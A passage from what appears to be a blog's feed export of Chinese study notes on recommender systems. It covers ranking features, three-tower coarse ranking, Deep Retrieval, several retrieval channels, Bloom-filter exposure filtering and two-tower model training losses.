笔记统计特征</h3><p>跟用户特征类似，系统会记录笔记最近 30 天（7 天、1 天、1 小时）的曝光数、点击数、点赞数、收藏数。如果点击率、点赞率等指标都很高，说明笔记质量很高，算法应该给这样的笔记更多的流量。使用不同的时间粒度也是合理的，有些笔记的时效性很强，这样的笔记在长时间之后热度肯定会下降。</p><p>按照用户性别分桶（可以反应出笔记更受男性欢迎还是更受女性欢迎）、按照用户年龄分桶……</p><p>还有作者的统计特征如下，这些特征反映了作者的受欢迎程度，以及作者的平均品质，如果一个作者的作品平均品质很高，那么他新发布的作品的品质应该也会很高。</p><ol><li>发布笔记数</li><li>粉丝数</li><li>消费指标（曝光数、点击数、点赞数、收藏数）</li></ol><h2 id="5-3-场景特征"><a href="#5-3-场景特征" class="headerlink" title="5.3 场景特征"></a>5.3 场景特征</h2><p>场景特征是随着推荐请求传来的，不用从用户画像和笔记画像的数据库中获取。</p><ol><li>用户定位 GeoHash（经纬度编码）、城市，用户可能对自己附近发生的事感兴趣</li><li>当前时刻（分段，做 embedding），用户不同时间对不同时间段发生的事情感兴趣</li><li>是否是周末、是否是节假⽇，节假日的时候可能对特定的话题感兴趣</li><li>手机品牌、手机型号、操作系统</li></ol><h2 id="5-4-特征处理"><a href="#5-4-特征处理" class="headerlink" title="5.4 特征处理"></a>5.4 特征处理</h2><p><font color=red>离散特征的处理很简单，就是做 Embedding</font>，离散特征有：</p><ul><li>用户 ID、笔记 ID、作者 ID</li><li>类目、关键词、城市、⼿机品牌</li></ul><p><font color=red>连续特征处理的第一种方法是做分桶，变成离散特征</font>，例如年龄、笔记字数和视频长度等。也可以做其他变换，例如：</p><ol><li>曝光数、点击数、点赞数等都是长尾分布，数值可以做 $\log(1+x)$</li><li>转化为点击率、点赞率等值，并做平滑</li></ol><p>在做特征工程的时候，需要考虑一下特征覆盖率，很多特征无法覆盖 $100\%$ 样本：</p><ol><li>例如很多用户不填年龄，因此用户年龄特征的覆盖率远小于 $100\%$</li><li>例如很多用户设置隐私权限，APP 不能获得用户地理定位，因此场景特征有缺失</li></ol><p>提⾼特征覆盖率，可以让精排模型更准。除了特征覆盖率，还要考虑一下，当特征缺失的时候使用什么作为默认值。</p><h2 id="5-5-数据服务"><a href="#5-5-数据服务" class="headerlink" title="5.5 数据服务"></a>5.5 数据服务</h2><p>推荐系统中用到三个数据源：用户画像、物品画像和统计数据。三个数据源都存储在数据库中，在线上服务的时候，排序服务器会从三个数据源取出所需的数据，然后把读取的数据做处理，作为特征送入模型后，模型就能预估出点击率等指标。</p><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_wZaoKfzG_y.png"></p><hr><h1 id="6-粗排"><a href="#6-粗排" class="headerlink" title="6 粗排"></a>6 粗排</h1><blockquote><p>粗排和精排的对比</p></blockquote><table><thead><tr><th></th><th>粗排</th><th>精排</th></tr></thead><tbody><tr><td><strong>工作量</strong></td><td>给几千篇笔记打分</td><td>给几百篇笔记打分</td></tr><tr><td><strong>推理代价</strong></td><td>单次推理代价必须小</td><td>单次推理代价很⼤</td></tr><tr><td><strong>准确性</strong></td><td>预估的准确性不⾼</td><td>预估的准确性更⾼</td></tr></tbody></table><h2 id="6-1-粗排的三塔模型"><a href="#6-1-粗排的三塔模型" class="headerlink" title="6.1 粗排的三塔模型"></a>6.1 粗排的三塔模型</h2><h3 id="6-1-1-模型架构"><a href="#6-1-1-模型架构" class="headerlink" title="6.1.1 模型架构"></a>6.1.1 模型架构</h3><p>只有一个用户，用户塔只做一次推理，即使用户塔很大，总计算量也不大。</p><p><font color=red><strong>物品塔（较大）：</strong></font>有 $n$ 个物品，理论上物品塔需要做 $n$ 次推理，PS 缓存物品塔的输出向量，避免绝大部分推理，只有遇到新物品的时候才需要做推理。</p><p><font color=red><strong>交叉塔（较小）：</strong></font>统计特征动态变化，缓存不可行，有 $n$ 个物品，交叉塔必须做 $n$ 次推理。</p><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_3pm1npRNiU.png"></p><p>有 $n$ 个物品，模型上层需要做 $n$ 次推理，粗排推理的大部分计算量在模型上层。</p><h3 id="6-1-2-模型推理"><a href="#6-1-2-模型推理" class="headerlink" title="6.1.2 模型推理"></a>6.1.2 模型推理</h3><p>首先从多个数据源取特征：</p><ol><li>$1$ 个用户的画像、统计特征。</li><li>$n$ 个物品的画像、统计特征。</li></ol><p>不论有多少个候选物品，用户塔只做 $1$ 次推理。物品塔只有在未命中缓存时需要做推理，实际上 $99\%$ 的物品都会命中。交叉塔的输入是动态特征，不能做缓存，必须做 $n$ 次推理。</p><p>三个塔分别输出三个向量，把这三个向量融合起来，作为上层网络的输入。上层网络必须做 $n$ 次推理，给 $n$ 个物品打分，没有办法通过缓存减少计算次数。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记4：召回3</title>
      <link href="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/"/>
      <url>/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Deep-Retrieval"><a href="#1-Deep-Retrieval" class="headerlink" title="1 Deep Retrieval"></a>1 Deep Retrieval</h1><p>经典的双塔模型把用户、物品表示为向量，线上做最近邻查找。Deep Retrieval 把物品表征为路径（path），线上查找用户最匹配的路径。Deep Retrieval 类似于阿⾥的 TDM。</p><h2 id="1-1-索引"><a href="#1-1-索引" class="headerlink" title="1.1 索引"></a>1.1 索引</h2><p>索引是把物品表征为路径，如下图所示：</p><ul><li>深度：$\text{depth} &#x3D;3$</li><li>宽度：$\text{width} &#x3D; K$</li></ul><p>把一个物品表示为一条路径（path），比如 $[2, 4, 1]$。一个物品可以表示为多条路径，比如 $[2,4,1]$、$[4,1,1]$。</p><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_0v-G8tf5F-.png"></p><p>之后建立两个索引，分别是物品到路径的索引和路径到物品的索引。其中一个物品可以对应多条路径，一条路径也可以对应多个物品。</p><h2 id="1-2-预估模型"><a href="#1-2-预估模型" class="headerlink" title="1.2 预估模型"></a>1.2 预估模型</h2><p>之后需要预估用户对路径的兴趣，用 3 个节点表示一条路径：$path &#x3D;[a, b, c]$：</p><ul><li>给定用户特征 $x$，预估用户对结点 $a$ 的兴趣 $p_{1}(a \mid {x})$</li><li>给定用户特征 $x$ 和 $a$，预估用户对结点 $a$ 的兴趣 $p_{2}(b \mid a; {x})$</li><li>给定用户特征 $x,a,b$，预估用户对结点 $a$ 的兴趣 $p_{3}(c \mid a,b; {x})$</li></ul><p>则可以得到用户对 $path &#x3D;[a, b, c]$ 的兴趣为：</p><p>$$<br>p(a, b, c \mid {x})&#x3D;p_{1}(a \mid {x}) \times p_{2}(b \mid a ; {x}) \times p_{3}(c \mid a, b ; {x})<br>$$</p><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_ZneEVrV0_G.png"></p><h2 id="1-3-线上召回"><a href="#1-3-线上召回" class="headerlink" title="1.3 线上召回"></a>1.3 线上召回</h2><p>线上召回的流程如下：</p><ol><li>给定用户特征，用神经网络做预估，用 beam search（束搜索）召回一批路径。</li><li>利用索引，召回一批物品，查看索引 $\text{path} \rightarrow \text{List} &lt;item &gt;$，每条路径对应多个物品。</li><li>对物品做排序，选出一个子集。</li></ol><blockquote><p>线上召回：$\text{user} \rightarrow \text{path} \rightarrow \text{item}$</p></blockquote><h3 id="1-3-1-束搜索"><a href="#1-3-1-束搜索" class="headerlink" title="1.3.1 束搜索"></a>1.3.1 束搜索</h3><p>假设有 3 层，每层 $K$ 个节点，那么一共有 $k^3$ 条路径。用神经⽹络给所有 $k^3$ 条路径打分，计算量太大。而是用 beam search，可以减小计算量。beam search 需要设置超参数 beam size。</p><blockquote><p>Beam Search（size &#x3D; 1）</p></blockquote><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_4463LQ2umn.png"></p><blockquote><p>Beam Search（size &#x3D; 4）</p></blockquote><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image__E1iTOdb6l.png"></p><h2 id="1-4-训练"><a href="#1-4-训练" class="headerlink" title="1.4 训练"></a>1.4 训练</h2><h3 id="1-4-1-学习神经网络参数"><a href="#1-4-1-学习神经网络参数" class="headerlink" title="1.4.1 学习神经网络参数"></a>1.4.1 学习神经网络参数</h3><p>训练时同时学习神经网络参数和物品表征，把神经网络的输出 $p(a, b, c \mid \mathbf{x})$ 用来预估用户对路径 $[a, b,c]$ 的兴趣。把一个物品表征为多条路径 ${[a, b, c]}$，建⽴索引：</p><ul><li>$\text{item} \rightarrow \text{List}〈path〉$</li><li>$\text{path} \rightarrow \text{List}〈item〉$</li></ul><p>正样本 $(user, item):click(user,item)&#x3D;1$。把物品表征为 $J$ 条路径：$\left[a_{1}, b_{1}, c_{1}\right], \cdots,\left[a_{J}, b_{J}, c_{J}\right]$，则用户对路径 $[a,b,c]$ 的兴趣：</p><p>$$<br>p(a, b, c \mid \mathbf{x})&#x3D;p_{1}(a \mid \mathbf{x}) \times p_{2}(b \mid a ; \mathbf{x}) \times p_{3}(c \mid a, b ; \mathbf{x}).<br>$$</p><p>如果用户点击过物品，说明用户对能够表示该物品的 $J$ 条路径全部感兴趣。所以应该让以下公式变大：</p><p>$$<br>\sum_{j&#x3D;1}^{J} p\left(a_{j}, b_{j}, c_{j} \mid \mathbf{x}\right)<br>$$</p><p>因此定义损失函数，损失应该越小越好，所以应该加上符号：</p><p>$$<br>loss &#x3D;-\log \left(\sum_{j&#x3D;1}^{J} p\left(a_{j}, b_{j}, c_{j} \mid \mathbf{x}\right)\right)<br>$$</p><p>这个神经网络的作用是判断用户对路径有多感兴趣，如果用户点击过物品，则认为用户对物品的 $J$ 条路径都感兴趣。</p><h3 id="1-4-2-学习物品表征"><a href="#1-4-2-学习物品表征" class="headerlink" title="1.4.2 学习物品表征"></a>1.4.2 学习物品表征</h3><p>除了训练上述神经网络的参数，还要学习物品的表征。用户 user 对路径 $path &#x3D;[a, b, c]$ 的兴趣记作：</p><p>$$<br>p( path \mid user )&#x3D;p(a, b, c \mid \mathbf{x})<br>$$</p><p>物品 item 与路径 path 的相关性：</p><p>$$<br>score(item, path) &#x3D;\sum_{\text {user }} p (path \mid user ) \times click(user, item)<br>$$</p><p>公式中的第一项是预估用户对路径的兴趣，第二项是用户是否点击（0或1）。根据 $score(item, path)$ 选出 $J$ 条路径作为 item 的表征。</p><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_dz9mP4VOIe.png"></p><p>以用户作为中间过渡，来计算物品和路径的关系。</p><p>之后选出 $J$ 条路径 $\Pi&#x3D;\{\operatorname{path}_{1}, \cdots, \operatorname{path}_{J} \}$，作为物品的表征。则损失函数（选择出与 item 高度相关的 path）为：</p><p>$$<br>\operatorname{loss}( item,\Pi)&#x3D;-\log \left(\sum_{j&#x3D;1}^{J} \operatorname{score}(item, \operatorname{path}_{j} ) \right)<br>$$</p><p>为了避免过多的 item 集中在一条 path 上，我们希望每条路径上的物品都比较平均，需要添加一个正则项，避免让它关联到更多的物品：</p><p>$$<br>\operatorname{reg}\left(\operatorname{path}_{j}\right)&#x3D;\left(\text { number of items on path }{ }_{j}\right)^{4}<br>$$</p><p>选中的路径有较高的分数 $score(item, path _{l} )$，而且路径上的物品数量不会太多。</p><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_DW9cVhZ1PQ.png"></p><h2 id="1-5-总结"><a href="#1-5-总结" class="headerlink" title="1.5 总结"></a>1.5 总结</h2><blockquote><p><strong>召回：</strong>用户 → 路径 → 物品</p></blockquote><p>在做召回的时候给定用户特征 $x$，用神经网络预估用户对路径 $path&#x3D;[a,b,c]$ 的兴趣，分数记作 $p(path|x)$。</p><p>用 beam search 寻找分数 $p(path|x)$ 最高的 $s$ 条 path，之后利用索引 $path \rightarrow List〈item〉$召回每条路径上的 $n$ 个物品。一共召回 $s \times n$ 个物品，对物品做初步排序，返回分数最高的若干物品。</p><blockquote><p><strong>训练：</strong>同时学习 用户—路径 和 物品—路径 的关系</p></blockquote><p>一个物品被表征为 $J $ 条路径：$\operatorname{path}_{1}, \cdots, \operatorname{path}_{J}$。如果用户点击过物品，则更新神经网络参数，使分数增大。</p><p>$$<br>\sum_{j&#x3D;1}^{J} p\left(\operatorname{path}_{j} \mid \mathbf{x}\right)<br>$$</p><p>如果用户对路径的兴趣分数 $p(path|x)$ 较高，且用户点击过物品 item，则 item 与 path 具有相关性。之后寻找与 item 最相关的 $J$ 条 path，且避免一条路径上物品过多。</p><hr><h1 id="2-其他召回通道"><a href="#2-其他召回通道" class="headerlink" title="2 其他召回通道"></a>2 其他召回通道</h1><h2 id="2-1-GeoHash-召回"><a href="#2-1-GeoHash-召回" class="headerlink" title="2.1 GeoHash 召回"></a>2.1 GeoHash 召回</h2><p>GeoHash 召回是一种地理位置召回，用户可能对附近发生的事感兴趣。GeoHash 对经纬度的编码，表示地图上一个长⽅形区域，之后以 GeoHash 建立索引，取回相关的优质笔记列表（按时间倒排）。</p><p>这条召回通道没有个性化，只是根据地理位置来进行召回。</p><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_1Sd9_2-leK.png"></p><p>如果用户允许 APP 获取用户定位，根据用户定位的 GeoHash，取回该地点最新的 $k$ 篇优质笔记。</p><h2 id="2-2-同城召回"><a href="#2-2-同城召回" class="headerlink" title="2.2 同城召回"></a>2.2 同城召回</h2><p>和上面的 GeoHash 相同，唯一的区别就是使用同一个城市内的内容进行召回。以城市为索引，建立优质笔记列表（按时间倒序），这条召回通道也没有个性化。</p><h2 id="2-3-作者召回"><a href="#2-3-作者召回" class="headerlink" title="2.3 作者召回"></a>2.3 作者召回</h2><p>如果你对一个作者感兴趣，那么系统就会给你推这个作者发布的其他内容。</p><p>系统维护 2 个索引：</p><ol><li>用户 → 关注的作者</li><li>作者 → 发布的笔记</li></ol><p>做召回时，按照用户 → 关注的作者 → 最新的笔记来进行召回。</p><h3 id="2-3-1-有交互的作者召回"><a href="#2-3-1-有交互的作者召回" class="headerlink" title="2.3.1 有交互的作者召回"></a>2.3.1 有交互的作者召回</h3><p><strong>有交互的作者召回：</strong>如果用户对某笔记感兴趣（点赞、收藏、转发），那么用户可能对该作者的其他笔记感兴趣。</p><ol><li><strong>索引：</strong>用户 → 有交互的作者</li><li><strong>召回：</strong>用户 → 有交互的作者 → 最新的笔记</li></ol><h3 id="2-3-2-相似作者召回"><a href="#2-3-2-相似作者召回" class="headerlink" title="2.3.2 相似作者召回"></a>2.3.2 相似作者召回</h3><p>如果用户喜欢某作者，那么用户喜欢相似的作者。</p><ol><li><strong>索引：</strong>作者 → 相似作者（$k$ 个作者）</li><li><strong>召回：</strong>用户 → 感兴趣的作者（$n$ 个作者）→ 相似作者（$nk$ 个作者）→ 最新的笔记（$nk$ 篇笔记）</li></ol><h2 id="2-4-缓存召回"><a href="#2-4-缓存召回" class="headerlink" title="2.4 缓存召回"></a>2.4 缓存召回</h2><p>主要想法是复用前 $n$ 次推荐精排的结果：精排输出几百篇笔记，送⼊重排，重排做多样性抽样，选出几十篇。其中，精排结果一大半没有曝光，被浪费。</p><p>把精排前 50 的物品，但是没有曝光的，缓存起来，作为一条召回通道。下次用户刷小红书的时候，作为一条召回通道再选出来。</p><p>由于缓存大小固定，需要退场机制。一些退场机制如下：</p><ol><li>一旦笔记成功曝光，就从缓存退场</li><li>如果超出缓存大小，就移除最先进入缓存的笔记</li><li>笔记最多被召回 10 次，达到 10 次就退场</li><li>每篇笔记最多保存 3 天，达到 3 天就退场</li></ol><h2 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h2><p>一共介绍了三大类一共六条召回通道，这些都是工业界一直在使用的，虽然比不上之前介绍的召回通道，但是也是很有效的召回方式。</p><ol><li>地理位置召回：GeoHash 召回、同城召回</li><li>作者召回：关注的作者、有交互的作者、相似的作者</li><li>缓存召回</li></ol><hr><h1 id="3-曝光过滤和-Bloom-Filter"><a href="#3-曝光过滤和-Bloom-Filter" class="headerlink" title="3 曝光过滤和 Bloom Filter"></a>3 曝光过滤和 Bloom Filter</h1><p><strong>曝光过滤问题：</strong>如果用户看过某个物品，则不再把该物品曝光给该用户。并不是所有的物品都有曝光过滤问题，像 youtube 这种长视频，看过的内容可以再次观看。</p><p>想要做曝光过滤，需要对于每个用户，记录已经曝光给他的物品（小红书只召回 1 个月以内的笔记，因此只需要记录每个用户最近 1 个月的曝光历史）。对于每个召回的物品，判断它是否已经给该用户曝光过，排除掉曾经曝光过的物品。</p><p>一位用户看过 $n$ 个物品，本次召回 $r$ 个物品，如果暴力对比，需要 $O(nr)$ 的时间，计算量太大，所以在实际应用中不使用暴力对比，而是使用 Bloom Filter。</p><h2 id="3-1-Bloom-Filter"><a href="#3-1-Bloom-Filter" class="headerlink" title="3.1 Bloom Filter"></a>3.1 Bloom Filter</h2><p>Bloom Filter 判断一个物品 ID 是否在已曝光的物品集合中。</p><ul><li>如果判断为 no，那么该物品一定不在集合中</li><li>如果判断为 yes，那么该物品很可能在集合中（可能误伤，错误判断未曝光物品为已曝光，将其过滤掉）</li></ul><p>所以使用 Bloom Filter 进行过滤，那么一定不会把曝光过的物品再次给用户，但是有可能会误伤。</p><p>Bloom Filter 把物品集合表征为一个 $m$ 维二进制向量，取值为 0 或 1。每个用户有一个曝光物品的集合，表征为一个向量，需要 $m$ bit 的存储。Bloom Filter 有 $k$ 个哈希函数，每个哈希函数把物品 ID 映射成介于 0 和 $m$ 之间的整数</p><blockquote><p>Bloom Filter（k &#x3D; 1）</p></blockquote><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_1HCjft9W-h.png"></p><blockquote><p>Bloom Filter（k &#x3D; 3）</p></blockquote><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_sx8Kds29H_.png"></p><p>记曝光物品集合大小为 $n$，二进制向量维度为 $m$，使用 $k$ 个哈希函数。则 Bloom Filter 误伤的概率为：</p><p>$$<br>\delta \approx\left(1-\exp \left(-\frac{k n}{m}\right)\right)^{k}<br>$$</p><ul><li>$n$ 越大，向量中的 1 越多，误伤的概率越大，即未曝光物品的 $k$ 个位置恰好都是 1 的概率大</li><li>$m$ 越大，向量越长，越不容易发生哈希碰撞，但是需要存储的信息就越多</li><li>$k$ 太大、太小都不好，$k$ 有最优取值</li></ul><p>设定可容忍的误伤概率为 $\delta$，那么最优参数为：</p><p>$$<br>k&#x3D;1.44 \cdot \ln \left(\frac{1}{\delta}\right), \quad m&#x3D;2 n \cdot \ln \left(\frac{1}{\delta}\right)<br>$$</p><h2 id="3-2-曝光过滤的链路"><a href="#3-2-曝光过滤的链路" class="headerlink" title="3.2 曝光过滤的链路"></a>3.2 曝光过滤的链路</h2><p><img src="/2024/10/14/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04%EF%BC%9A%E5%8F%AC%E5%9B%9E3/image_oTobeFPM49.png"></p><p>在用户刷新之前就要把本次曝光的结果写到 Bloom Filter 上，否则下一刷很有可能曝光重复的物品。所以使用实时流处理，Flink 实时读取 Kafka 队列，做实时计算，计算曝光物品的哈希值，把结果写到 Bloom Filter 的二进制向量上。用这样的实时数据链路，在物品曝光之后，这位用户的 Bloom Filter 就会被修改，之后就能有效避免曝光重复。但是实时流也最容易出问题，例如实时流挂掉了或者延迟特别大，那么推荐效果就会变差。</p><p>之后 Bloom Filter 把物品的二进制向量传送给召回服务器。在召回服务器上，用 Bloom Filter 计算召回的物品的哈希值，之后再和二进制向量做对比，把已经曝光的物品给过滤掉。</p><h2 id="3-3-Bloom-Filter-的缺点"><a href="#3-3-Bloom-Filter-的缺点" class="headerlink" title="3.3 Bloom Filter 的缺点"></a>3.3 Bloom Filter 的缺点</h2><p>Bloom Filter 把物品的集合表⽰成一个二进制向量，每往集合中添加一个物品，只需要把向量 $k$ 个位置的元素置为 1（如果原本就是 1，则不变）。</p><p>但是 Bloom Filter 只支持添加物品，不支持删除物品。从集合中移除物品，无法消除它对向量的影响，这是因为向量中的元素是所有物品共享的，如果把向量的一个元素改为 0，相当于很多物品都给删除了。想要删除一个物品，就需要重新计算所有物品的二进制向量。</p><p>每天都需要从物品集合中移除年龄大于 1 个月的物品（超龄物品不可能被召回，没必要把它们记录在 Bloom Filter，降低 $n$ 可以降低误伤率）。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记3：召回2</title>
      <link href="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/"/>
      <url>/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/</url>
      
        <content type="html"><![CDATA[<h1 id="1-双塔模型"><a href="#1-双塔模型" class="headerlink" title="1 双塔模型"></a>1 双塔模型</h1><h2 id="1-1-模型结构"><a href="#1-1-模型结构" class="headerlink" title="1.1 模型结构"></a>1.1 模型结构</h2><p>双塔模型可以看作是矩阵补充模型的升级版。可以对用户 ID、用户离散特征和用户连续特征做处理，处理之后得到很多向量，并把这些向量拼起来。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_Z3Pn2_zek5.png"></p><p>之后输入深度神经网络，神经网络可以是很复杂的结构，神经网络输出一个向量，这个向量就是对用户的表征。</p><p>对物品的处理也是类似，如下：</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_NbS8YNpj40.png"></p><p>双塔模型的不同之处在于使用了除了 ID 之外的更多的信息来进行处理，如下图所示，可以看到整体结构就像两个塔一样：</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_nJszoNsLB1.png"></p><p>两个塔的输出都是一个向量，之后再计算这两个向量的余弦相似度，余弦相似度的大小介于 $[-1, 1]$。</p><h2 id="1-2-模型训练"><a href="#1-2-模型训练" class="headerlink" title="1.2 模型训练"></a>1.2 模型训练</h2><p>双塔模型的训练可以有以下 3 种方法：</p><ol><li><code>Pointwise</code>：独⽴看待每个正样本、负样本，做简单的二元分类</li><li><code>Pairwise</code>：每次取一个正样本、一个负样本</li><li><code>Listwise</code>：每次取一个正样本、多个负样本</li></ol><p>如何选择正负样本？</p><ol><li>正样本：用户点击的物品</li><li>负样本：可以有多种定义，比如没有被召回的、召回但是被粗排、精排淘汰的、曝光但是未点击的</li></ol><h3 id="1-2-1-Pointwise-训练"><a href="#1-2-1-Pointwise-训练" class="headerlink" title="1.2.1 Pointwise 训练"></a>1.2.1 Pointwise 训练</h3><p>把召回看作二元分类任务：</p><ol><li>对于正样本，⿎励 $\cos(a,b)$ 接近 $+1$</li><li>对于负样本，⿎励 $\cos(a,b)$ 接近 $-1$</li></ol><blockquote><p>一般控制正负样本数量为 $1:2$ 或者 $1:3$</p></blockquote><h3 id="1-2-2-Pairwise-训练"><a href="#1-2-2-Pairwise-训练" class="headerlink" title="1.2.2 Pairwise 训练"></a>1.2.2 Pairwise 训练</h3><p>如下图所示，同时取一个正样本和一个负样本，然后经过神经网络得到一个特征向量，正负样本通过的神经网络的参数是相同的（都是物品塔）。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_tP4zUn3T3R.png"></p><p>之后分别计算 $\cos(a,b^+)$ 和 $\cos(a,b^-)$ ，模型要鼓励 $\cos(a,b^+)$ 大于 $\cos(a,b^-)$，而且两者之差越大越好。</p><p>如果 $\cos(a,b^+)$ 大于 $\cos(a,b^-) + m$，则没有损失。否则，损失等于 $\cos(a, b^-)+m-\cos(a,b^+)$，即鼓励 $\cos(a,b^+)$ 比 $\cos(a,b^-)$ 大 $m$ ，其中 $m$ 是个超参数。</p><p>最终的 <code>Triplet hinge loss</code> 如下：</p><p>$$<br>L(\mathbf{a}, \mathbf{b}^{+}, \mathbf{b}^{-})&#x3D;\max \{0, \cos \left(\mathbf{a}, \mathbf{b}^{-}\right)+m-\cos \left(\mathbf{a}, \mathbf{b}^{+}\right)\}<br>$$</p><p><code>Triplet logistic loss</code> 如下：</p><p>$$<br>L\left(\mathbf{a}, \mathbf{b}^{+}, \mathbf{b}^{-}\right)&#x3D;\log \left(1+\exp \left[\sigma \cdot\left(\cos \left(\mathbf{a}, \mathbf{b}^{-}\right)-\cos \left(\mathbf{a}, \mathbf{b}^{+}\right)\right)\right]\right)<br>$$</p><p>训练样本都是三元组，分别为用户、一个正样本和一个负样本。</p><h3 id="1-2-3-Listwise-训练"><a href="#1-2-3-Listwise-训练" class="headerlink" title="1.2.3 Listwise 训练"></a>1.2.3 Listwise 训练</h3><p>一条数据包括：</p><ol><li>一个用户，特征向量记作 $a$</li><li>一个正样本，特征向量记作 $b^+$</li><li>多个负样本，特征向量记作 ${b}_{1}^{-}, \cdots, {b}_{n}^{-}$</li></ol><p>这里鼓励 $\cos \left(\mathrm{a}, \mathrm{b}^{+}\right)$ 尽量大，$\cos \left(\mathrm{a}, {b}_{1}^{-}\right), \cdots, \cos \left(\mathrm{a}, {b}_{n}^{-}\right)$ 尽量小。</p><p><img src="/2024/10/13/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03%EF%BC%9A%E5%8F%AC%E5%9B%9E2/image_u9NxkYKc6S.png"></p><p>训练的时候把 $n+1$ 个分数输入 <code>softmax</code> 激活函数，输出 $n+1$ 个分数，这些分数都介于 $0 \sim 1$ 之间。</p><ul><li>左边的 $s^+$ 表示正样本的分数，这个分数越大越好，最好能接近1</li><li>右边的 $s^-_1 \sim s^-_n$ 表示负样本的分数，希望这些分数越小越好，最好能接近0</li></ul><p>用 $y$ 和 $s$ 的交叉熵作为损失函数，训练的时候最小化交叉熵，相当于最大化 $s^+$，也就等价于最大化正样本的余弦相似度，最小化负样本的余弦相似度。</p><h2 id="1-3-不适于召回的模型"><a href="#1-3-不适于召回的模型" class="headerlink" title="1.3 不适于召回的模型"></a>1.3 不适于召回的模型</h2><p>一看到下面这种结构，就立马反应出是粗排或精排的模型，而不是召回的模型，这种模型没办法应用到召回。</p><p><img 